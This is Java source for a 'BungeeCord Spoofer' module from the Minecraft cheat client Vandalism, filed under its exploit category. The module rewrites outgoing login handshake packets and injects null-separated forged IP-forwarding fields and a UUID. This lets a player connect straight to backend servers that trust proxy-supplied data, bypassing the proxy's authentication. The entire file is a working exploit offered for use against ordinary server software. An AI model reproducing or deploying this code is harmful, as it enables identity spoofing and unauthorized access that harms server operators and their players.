/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit;

import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.BooleanValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.StringValue;
import de.nekosarekawaii.vandalism.event.cancellable.network.OutgoingPacketListener;
import de.nekosarekawaii.vandalism.feature.module.AbstractModule;
import net.minecraft.network.packet.c2s.handshake.ConnectionIntent;
import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket;
import java.util.concurrent.ThreadLocalRandom;

public class BungeeCordSpooferModule extends AbstractModule implements OutgoingPacketListener {

    private final BooleanValue customizeIP = new BooleanValue(
            this,
            "Customize IP",
            "Allows you to define the ip by yourself.",
            false
    );

    private final StringValue ip = new StringValue(
            this,
            "IP",
            "The IP that will be used.",
            "127.0.0.1"
    ).visibleCondition(this.customizeIP::getValue);

    public BungeeCordSpooferModule() {
        super(
                "BungeeCord Spoofer",
                "Allows you to connect to a BungeeCord sub server.",
                Category.EXPLOIT
        );
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(OutgoingPacketEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(OutgoingPacketEvent.ID, this);
    }

    private String getRandomIpPart() {
        return String.valueOf(ThreadLocalRandom.current().nextInt(256));
    }

    @Override
    public void onOutgoingPacket(final OutgoingPacketEvent event) {
        if (event.packet instanceof final HandshakeC2SPacket packet && packet.intendedState() == ConnectionIntent.LOGIN) {
            packet.address += "\u0000";
            if (this.customizeIP.getValue()) {
                packet.address += this.ip.getValue();
            } else {
                packet.address += this.getRandomIpPart() + "." + this.getRandomIpPart() + "." + this.getRandomIpPart() + "." + this.getRandomIpPart();
            }
            packet.address += "\u0000";
            packet.address += this.mc.session.getUuidOrNull().toString().replace("-", "");
        }
    }

}
